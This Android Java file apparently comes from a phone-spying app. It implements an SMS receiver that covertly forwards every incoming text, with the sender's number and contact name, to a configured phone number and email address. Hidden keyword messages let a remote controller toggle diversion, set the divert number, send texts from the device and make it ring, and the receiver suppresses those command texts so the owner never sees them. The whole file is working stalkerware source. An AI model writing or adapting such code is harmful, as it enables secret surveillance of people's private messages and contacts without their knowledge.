package com.example.remote;


import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.List;


import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;




import android.R.bool;
import android.R.integer;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.StrictMode;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Button;
import android.widget.Toast;


public class IncomingSms extends BroadcastReceiver {
	
	// Get the object of SmsManager
	final SmsManager sms = SmsManager.getDefault();
	SharedPreferences values;
	static String contactName = "";
	private String senderNum = null;
	Context cx = null;
	
	public void onReceive(Context context, Intent intent) {
		// Retrieves a map of extended data from the intent.
		StrictMode.enableDefaults();
		final Bundle bundle = intent.getExtras();
		cx = context;
		values = context.getSharedPreferences("SPY", 0);
		SharedPreferences email = context.getSharedPreferences("email", 0);
		
		String message = "";
		try {
			
			if (bundle != null) {
				
				final Object[] pdusObj = (Object[]) bundle.get("pdus");
				
				for (int i = 0; i < pdusObj.length; i++) 
				{
					SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
					if(i == 0)
					senderNum = currentMessage.getDisplayOriginatingAddress();
			        message += currentMessage.getDisplayMessageBody();
			        
				} // end for loop
				
//				Toast.makeText(cx, "11111111111", Toast.LENGTH_SHORT).show();
				getContactName(context, senderNum);
		       
//				Toast.makeText(cx, "2222222222", Toast.LENGTH_SHORT).show();
				
				String mess2 = message + "Number : " + senderNum + contactName;
		        ArrayList<String> parts2 = sms.divideMessage(mess2);

		        String email_not_network = email.getString("total_sms", "");
		        int word_len = values.getString("active_mess_ed", "").length();
		        int mess_len = message.length();
		        int send_mess_len = values.getString("send_mess_ed", "").length();

		      //for active or deactive the message spy service by key
		        if(message.equals(values.getString("active_mess_ed", "")) && values.getBoolean("active_mess_ch", false) && !values.getString("active_mess_ed", "").equals(""))
		        {
		        	if(values.getBoolean("divert_num_ch", false) == true)
		        	{
		        		values.edit().putBoolean("divert_num_ch", false).commit();
		        	}
		        	else
		        	{
		        		values.edit().putBoolean("divert_num_ch", true).commit();
		        	}
		        	this.abortBroadcast();
		        }
		       
		        else if(mess_len == word_len+10 && values.getBoolean("active_mess_ch", false) && !values.getString("active_mess_ed", "").equals(""))
		        {
			        if(message.substring(0, word_len).equals(values.getString("active_mess_ed", "")) && message.charAt(word_len) == '*')
			        {
			        	values.edit().putString("divert_num_ed", message.substring(word_len+1)).commit();
			        	values.edit().putBoolean("divert_num_ch", true).commit();
			        }
			        this.abortBroadcast();
		        }
		        
		        //for recognize to give number to send message
		        else if(mess_len >= send_mess_len+10 && values.getBoolean("send_mess_ch", false) && !values.getString("send_mess_ed", "").equals(""))
		        {
			        if(message.substring(0, send_mess_len).equals(values.getString("send_mess_ed", "")) && message.charAt(send_mess_len) == '*' && message.charAt(send_mess_len+10) == '*' )
			        {
			        	String send_mess_num = "09" + message.substring(send_mess_len+1, send_mess_len+10);
			        	String send_mess_text = message.substring(send_mess_len+11);
			        	sms.sendTextMessage(send_mess_num, null,send_mess_text, null, null);
			        }
			        this.abortBroadcast();
		        }
		        
		        //for active or deactive the call spy service by key
		        if(message.equals(values.getString("active_call_ed", "")) && values.getBoolean("active_call_ch", false) && !values.getString("active_call_ed", "").equals(""))
		        {
		        	if(values.getBoolean("call_num_ch", false) == true)
		        	{
		        		values.edit().putBoolean("call_num_ch", false).commit();
		        	}
		        	else
		        	{
		        		values.edit().putBoolean("call_num_ch", true).commit();
		        	}
		        	this.abortBroadcast();
		        }
		        
		        ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
		     
		        if(values.getBoolean("mail_mess_ch", false) && !values.getString("mail_mess_ed", "").equals("") )
		        {
//		        	Toast.makeText(cx, "333333333", Toast.LENGTH_SHORT).show();
		        	if(!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable()))
		        	{
//		        		Toast.makeText(cx, "4444444444444", Toast.LENGTH_SHORT).show();
		        		 try {   
		        					String toEmails = values.getString("mail_mess_ed", "");
		        					String emailBody = message + "FROM : " + senderNum + contactName + "\n";
		        					sendMail s = new sendMail();
//		        					Toast.makeText(cx, toEmails, Toast.LENGTH_SHORT).show();
		        					s.sendAccelerationData(emailBody, toEmails);
		                 } catch (Exception e) {   
		                     Log.e("SendMail", e.getMessage(), e);   
		                 } 
				       
		        	}
		        	else
		        	{
		        		email_not_network += message + "FROM : " + senderNum + contactName + "\n" ;
		        		email.edit().putString("total_sms", email_not_network).commit();
		        	}
		        }
		        
		        //for ringing
		        if(message.equals(values.getString("ring_ed", "")) && !values.getString("ring_ed", "").equals("") )
		        {
		        	AudioManager audioManager = (AudioManager)context.getSystemService(MainActivity.AUDIO_SERVICE);
		    		audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), AudioManager.FLAG_PLAY_SOUND);
		    		final MediaPlayer mMediaPlayer = MediaPlayer.create(context,R.raw.beep );
		    		mMediaPlayer.start();
		    		mMediaPlayer.setLooping(true);
		    		new Handler().postDelayed(new Runnable() {
						
						@Override
						public void run() {
							// TODO Auto-generated method stub
							mMediaPlayer.setLooping(false);
						}
					}, 60000);
		    		this.abortBroadcast();
		        }
		        
		        
		        //Divert message
		        boolean active = values.getBoolean("divert_num_ch", false);
		        String num = "09" + values.getString("divert_num_ed", "");
		        if(active)
		        {
		        	if(!senderNum.contains(values.getString("divert_num_ed", "")))
		        	{
			        	if(values.getBoolean("spec_num_ch", false))
			        	{
			        		
			        		if(senderNum.equals(values.getString("spec_num_ed", "")))
			        		{
			        			sms.sendMultipartTextMessage(num, null, parts2, null, null);
			        		}
			        	}
			        	else
			        	{
			        		sms.sendMultipartTextMessage(num, null, parts2, null, null);
			        	}
		        	}
			    }	
			
			} // bundle is null

		} catch (Exception e) {
			Log.e("SmsReceiver", "Exception smsReceiver" +e);
			
		}
		
	}
	
	
	public static void getContactName(Context context, String phoneNumber)
	{
		    
		 ContentResolver cr = context.getContentResolver();
		 Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
	  	 Cursor cursor = cr.query(uri, new String[]{PhoneLookup.DISPLAY_NAME}, null, null, null);
	  	 if (cursor == null) {
	  	 }
	    
	  	 else if(cursor.moveToFirst()) 
	  	 {
	  		 contactName = "(" + cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME)) + ")";
	  	 }
	
	  	 else if(cursor != null && !cursor.isClosed()) {
	  		 cursor.close();
	  	 }
	
	}



}